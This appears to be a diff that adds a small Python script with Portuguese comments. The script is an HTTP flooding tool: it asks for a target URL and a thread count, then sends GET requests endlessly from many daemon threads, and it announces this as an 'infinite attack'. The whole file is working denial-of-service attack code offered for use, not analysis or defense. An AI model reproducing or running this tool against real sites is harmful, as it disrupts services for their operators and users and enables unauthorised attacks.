@@ -1,0 +1,63 @@
+import requests
+import threading
+from colorama import Fore, Style, init
+import os
+
+init(autoreset=True)  # habilita cores automáticas
+
+# Cabeçalhos básicos
+HEADERS = {
+    "User-Agent": "fsociety-agent/9.9.9",
+    "Accept": "*/*",
+    "Connection": "keep-alive"
+}
+
+# Exibe a arte
+def banner():
+    os.system("clear" if os.name != "nt" else "cls")
+    print(Fore.RED + '''
+███████╗███████╗ ██████╗  ██████╗  ██████╗ ████████╗██╗███████╗██╗   ██╗
+██╔════╝██╔════╝██╔═══██╗██╔════╝ ██╔═══██╗╚══██╔══╝██║██╔════╝╚██╗ ██╔╝
+███████╗█████╗  ██║   ██║██║  ███╗██║   ██║   ██║   ██║█████╗   ╚████╔╝
+╚════██║██╔══╝  ██║   ██║██║   ██║██║   ██║   ██║   ██║██╔══╝    ╚██╔╝
+███████║███████╗╚██████╔╝╚██████╔╝╚██████╔╝   ██║   ██║███████╗   ██║
+╚══════╝╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   ╚═╝╚══════╝   ╚═╝
+    ''')
+
+# Função que envia requisições sem parar
+def flood(url):
+    while True:
+        try:
+            r = requests.get(url, headers=HEADERS, timeout=5)
+            if r.status_code == 200:
+                print(Fore.GREEN + "[200 OK] Site respondeu normalmente.")
+            else:
+                print(Fore.YELLOW + f"[{r.status_code}] Resposta recebida.")
+        except:
+            print(Fore.RED + "[ERR] Site falhou ou bloqueou.")
+
+# Main
+def main():
+    banner()
+    url = input(Fore.CYAN + "🔗 Digite a URL do alvo (ex: http://exemplo.com): ").strip()
+    try:
+        threads = int(input(Fore.MAGENTA + "💥 Quantas threads simultâneas (ex: 100)? "))
+    except:
+        print("Entrada inválida.")
+        return
+
+    print(Fore.MAGENTA + "\n🔥 Iniciando ataque infinito... pressione CTRL+C para parar.\n")
+
+    for _ in range(threads):
+        t = threading.Thread(target=flood, args=(url,))
+        t.daemon = True
+        t.start()
+
+    try:
+        while True:
+            pass  # mantém o script rodando
+    except KeyboardInterrupt:
+        print(Style.RESET_ALL + "\n\n❌ Ataque interrompido pelo usuário.")
+
+if __name__ == "__main__":
+    main()
